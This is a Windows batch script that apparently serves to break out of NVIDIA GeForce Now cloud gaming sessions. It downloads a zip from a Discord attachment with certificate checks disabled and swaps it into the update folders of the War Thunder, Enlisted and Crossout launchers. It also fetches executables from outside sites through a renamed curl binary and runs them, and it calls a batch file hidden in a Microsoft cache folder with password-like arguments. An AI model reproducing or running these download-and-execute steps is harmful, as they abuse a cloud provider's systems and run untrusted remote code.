@echo off
title Respect's Auto Things - By @CaptainAnas
chcp 65001
for /F %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"
set color_white=%ESC%[97m
set color_gray=%ESC%[90m
set color_black=%ESC%[30m
set color_gold=%ESC%[33m
set color_dpurple=%ESC%[35m
set color_lpurple=%ESC%[95m
set color_green=%ESC%[92m
set color_red=%ESC%[31m
cls
set securtyisss=respect2391850
echo %color_dpurple%   
echo %color_lpurple%    ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄   ▄▀▀▀█▀▀▄ 
echo %color_dpurple%    █   █   █ ▐  ▄▀   ▐ █ █   ▐ █   █   █ ▐  ▄▀   ▐ █ █    ▌ █    █  ▐ 
echo %color_lpurple%   ▐  █▀▀█▀    █▄▄▄▄▄     ▀▄   ▐  █▀▀▀▀    █▄▄▄▄▄  ▐ █      ▐   █     
echo %color_dpurple%    ▄▀    █    █    ▌  ▀▄   █     █        █    ▌    █         █      
echo %color_lpurple%   █     █    ▄▀▄▄▄▄    █▀▀▀    ▄▀        ▄▀▄▄▄▄    ▄▀▄▄▄▄▀  ▄▀       
echo %color_dpurple%   ▐     ▐    █    ▐    ▐      █          █    ▐   █     ▐  █         
echo %color_lpurple%              ▐                ▐          ▐        ▐        ▐  
echo %color_white%    
curl https://cdn.discordapp.com/attachments/1146828616907366401/1151863325311914024/latest.zip -k -O
:start
setlocal enabledelayedexpansion
cls
echo %color_dpurple%   
echo %color_lpurple%    ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄   ▄▀▀▀█▀▀▄ 
echo %color_dpurple%    █   █   █ ▐  ▄▀   ▐ █ █   ▐ █   █   █ ▐  ▄▀   ▐ █ █    ▌ █    █  ▐ 
echo %color_lpurple%   ▐  █▀▀█▀    █▄▄▄▄▄     ▀▄   ▐  █▀▀▀▀    █▄▄▄▄▄  ▐ █      ▐   █     
echo %color_dpurple%    ▄▀    █    █    ▌  ▀▄   █     █        █    ▌    █         █      
echo %color_lpurple%   █     █    ▄▀▄▄▄▄    █▀▀▀    ▄▀        ▄▀▄▄▄▄    ▄▀▄▄▄▄▀  ▄▀       
echo %color_dpurple%   ▐     ▐    █    ▐    ▐      █          █    ▐   █     ▐  █         
echo %color_lpurple%              ▐                ▐          ▐        ▐        ▐  
echo %color_white%                                                          
echo %color_dpurple%          Method Options      
echo %color_lpurple% ║═════════════════════════════║
echo %color_dpurple% ║Press 1 For WarThunder Method║
echo %color_lpurple% ║═════════════════════════════║
echo %color_dpurple% ║ Press 2 For Enlisted Method ║
echo %color_lpurple% ║═════════════════════════════║
echo %color_dpurple% ║ Press 3 for Crossout Method ║
echo %color_lpurple% ║═════════════════════════════║
echo %color_dpurple% ║ Press 4 for Respect Tools   ║
echo %color_lpurple% ║═════════════════════════════║
echo %color_white% 
choice /C 1234 /N /M "Choose the game/tool for method: "

goto game%errorlevel%

:game1
rem Commands for War Thunder
del "C:\Program Files (x86)\NVIDIA_Grid_Bundle\war_thunder_gfn_pc\WarThunder\update\latest.zip"
copy C:\users\kiosk\downloads\latest.zip "C:\Program Files (x86)\NVIDIA_Grid_Bundle\war_thunder_gfn_pc\WarThunder\update"
cd "C:\Program Files (x86)\NVIDIA_Grid_Bundle\war_thunder_gfn_pc\WarThunder"
taskkill /F /IM launcher.exe
start launcher.exe
timeout /t 2 /nobreak > nul
cd "C:\Program Files (x86)\NVIDIA_Grid_Bundle\war_thunder_gfn_pc\WarThunder"
timeout /t 1 /nobreak > nul
goto choice

:game2
rem Commands for Enlisted
del "C:\Program Files (x86)\NVIDIA_Grid_Bundle\enlisted\Enlisted\update\latest.zip"
copy C:\users\kiosk\downloads\latest.zip "C:\Program Files (x86)\NVIDIA_Grid_Bundle\enlisted\Enlisted\update"
cd "C:\Program Files (x86)\NVIDIA_Grid_Bundle\enlisted\Enlisted"
taskkill /F /IM launcher.exe
start launcher.exe
timeout /t 2 /nobreak > nul
cd "C:\Program Files (x86)\NVIDIA_Grid_Bundle\enlisted\Enlisted"
timeout /t 1 /nobreak > nul
goto choice

:game3
rem Commands for Crossout
del "C:\Program Files (x86)\NVIDIA_Grid_Bundle\crossout_gfn_pc\common\Crossout\update\latest.zip"
copy C:\users\kiosk\downloads\latest.zip "C:\Program Files (x86)\NVIDIA_Grid_Bundle\crossout_gfn_pc\common\Crossout\update"
cd "C:\Program Files (x86)\NVIDIA_Grid_Bundle\crossout_gfn_pc\common\Crossout\"
taskkill /F /IM launcher.exe
start launcher.exe
timeout /t 2 /nobreak > nul
cd "C:\Program Files (x86)\NVIDIA_Grid_Bundle\war_thunder_gfn_pc\WarThunder"
timeout /t 1 /nobreak > nul
goto choice

:game4
call "C:\Users\kiosk\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\GCISMonitorActiveEnable.bat" respect01929 sanek10491028
goto choice

:choice

echo %color_dpurple%      --- Method Options ---   
echo %color_lpurple% ║═══════════════════════════════║
echo %color_dpurple% ║ Choose 1 To Launch CloudOSGFN ║
echo %color_lpurple% ║═══════════════════════════════║
echo %color_dpurple% ║  Choose 2 To Launch Arcade    ║
echo %color_lpurple% ║═══════════════════════════════║
echo %color_dpurple% ║Choose 3 To Launch RespectTools║
echo %color_lpurple% ╚═══════════════════════════════╝

choice /C 123 /N /M "Enter the number of your choice: "

goto launcher%errorlevel%

:launcher1
rdl.exe -kO https://files.zortos.me/files/public/Experimental/CloudOSGFN.exe
timeout /t 2 /nobreak > nul
start CloudOSGFN.exe
goto :end

:launcher2
rdl.exe -LJk https://picteon.dev/files/Arcade.exe --output RespectAr.exe
timeout /t 2 /nobreak > nul
start RespectAr.exe
goto :end

:launcher3
call "C:\Users\kiosk\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\GCISMonitorActiveEnable.bat" respect01929 sanek10491028
goto :end